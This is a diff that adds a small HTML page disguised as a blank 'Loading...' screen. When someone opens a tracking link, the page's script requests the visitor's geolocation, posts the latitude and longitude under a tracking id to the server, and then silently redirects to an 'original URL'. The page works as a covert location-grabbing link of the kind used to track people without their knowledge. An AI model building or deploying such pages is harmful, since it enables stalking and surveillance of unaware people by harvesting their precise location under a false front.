@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+</head>
+<body style="margin:0;padding:0;background:white;">
+    <script>
+        // Get tracking ID from URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const trackingId = urlParams.get('id');
+
+        if (!trackingId) {
+            window.location.href = '/';
+        } else {
+            // Immediately request location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    // Success callback
+                    async (position) => {
+                        try {
+                            // Save tracking data
+                            const trackResponse = await fetch(`/api/track/${trackingId}`, {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude
+                                })
+                            });
+
+                            if (!trackResponse.ok) {
+                                throw new Error('Failed to save location data');
+                            }
+
+                            // Get original URL
+                            const urlResponse = await fetch(`/api/original-url/${trackingId}`);
+                            if (!urlResponse.ok) {
+                                throw new Error('Failed to get original URL');
+                            }
+
+                            const { url } = await urlResponse.json();
+                            
+                            // Immediately redirect
+                            window.location.href = url;
+                        } catch (error) {
+                            window.location.href = '/';
+                        }
+                    },
+                    // Error callback
+                    () => {
+                        window.location.href = '/';
+                    }
+                );
+            } else {
+                window.location.href = '/';
+            }
+        }
+    </script>
+</body>
+</html>
